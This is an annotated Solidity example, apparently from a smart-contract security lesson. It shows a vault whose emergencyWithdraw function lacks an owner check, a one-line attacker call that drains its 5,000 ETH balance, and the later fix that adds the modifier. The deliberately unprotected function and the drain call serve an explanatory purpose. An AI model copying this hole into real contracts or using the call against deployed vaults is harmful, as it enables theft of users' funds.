// Contract source analysis reveals the vulnerability
contract Vault {
    address public owner;
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function setFeeRecipient(address _new) external onlyOwner { ... } // ✓ Protected
    function setWithdrawalLimit(uint _limit) external onlyOwner { ... } // ✓ Protected

    // ⚠️ MISSING onlyOwner modifier!
    function emergencyWithdraw(address token, uint256 amount) external {
        IERC20(token).transfer(msg.sender, amount);
    }
}

// Attacker drains entire balance in one call
interface IVault {
    function emergencyWithdraw(address token, uint256 amount) external;
}

IVault(vault).emergencyWithdraw(
    WETH_ADDRESS,
    5_000 ether  // entire balance
);
// ✓ Transaction succeeds — no access control!
// Attacker receives 5,000 ETH ($10,000,000)

// Owner reacts — but it's too late
contract Vault {
    bool public paused;

    function pause() external onlyOwner {
        paused = true;
        emit Paused(msg.sender);
    }

    // Even if they add a fix:
    function emergencyWithdraw(address token, uint256 amount) 
        external 
        onlyOwner  // ← Fix: add modifier
        whenNotPaused 
    {
        IERC20(token).transfer(msg.sender, amount);
    }
}
// ⚠️ Cannot be applied retroactively without upgrade mechanism

